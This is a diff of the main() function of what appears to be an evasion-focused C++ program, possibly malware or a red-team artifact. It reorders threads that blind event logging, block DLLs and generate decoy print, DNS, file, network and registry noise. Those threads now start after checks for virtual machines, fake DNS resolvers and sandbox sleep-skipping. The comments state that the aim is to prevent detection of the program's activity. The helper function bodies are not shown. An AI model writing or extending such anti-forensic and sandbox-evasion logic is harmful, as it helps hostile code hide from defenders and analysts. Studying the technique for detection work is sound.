@@ -26,10 +26,6 @@
 int main(int argc, char **argv)
 {
 // Disables certain services / functions to prevent the detection or collection of the activities of the program
-#ifdef _REGISTRY_HAMMERING_ENABLED
-    find_dir();
-#endif
-
 #ifdef _EVENTLOG_BLIND_ENABLED
     std::thread eventlogBlindThread(eventlogkiller);
     eventlogBlindThread.join();
@@ -44,24 +40,6 @@ int main(int argc, char **argv)
     std::thread blockdllBlindThread(blockdlls);
     blockdllBlindThread.join();
 #endif
-
-
-#ifdef _PRINT_NOISE_ENABLED
-    std::thread printNoiseThread(printLoop, _PRINT_NOISE_TEXT);
-#endif
-
-#ifdef _DNS_NOISE_ENABLED
-    std::thread dnsNoiseThread(queryDomains);
-#endif
-
-#ifdef _FILE_NOISE_ENABLED
-    std::thread fileNoiseThread(generateFiles);
-#endif
-
-#ifdef _NETWORK_NOISE_ENABLED
-    std::thread networkNoiseThread(random_connect);
-#endif
-
 
 // Does system checks to ensure that the system does not have any undesirable conditions 
 // (e.g. VM environment, fake DNS resolvers such as FakeNet etc)
@@ -93,6 +71,27 @@ int main(int argc, char **argv)
 #ifdef _SLEEP_ANALYSIS_ENABLED
     std::thread sleepAnalysisThread(sleep_check, _SLEEP_TIME);
     sleepAnalysisThread.join();
+#endif
+
+
+#ifdef _PRINT_NOISE_ENABLED
+    std::thread printNoiseThread(printLoop, _PRINT_NOISE_TEXT);
+#endif
+
+#ifdef _DNS_NOISE_ENABLED
+    std::thread dnsNoiseThread(queryDomains);
+#endif
+
+#ifdef _FILE_NOISE_ENABLED
+    std::thread fileNoiseThread(generateFiles);
+#endif
+
+#ifdef _NETWORK_NOISE_ENABLED
+    std::thread networkNoiseThread(random_connect);
+#endif
+#ifdef _REGISTRY_NOISE_ENABLED
+    std::thread registryNoiseThread(find_dir);
+    registryNoiseThread.join();
 #endif
 
 
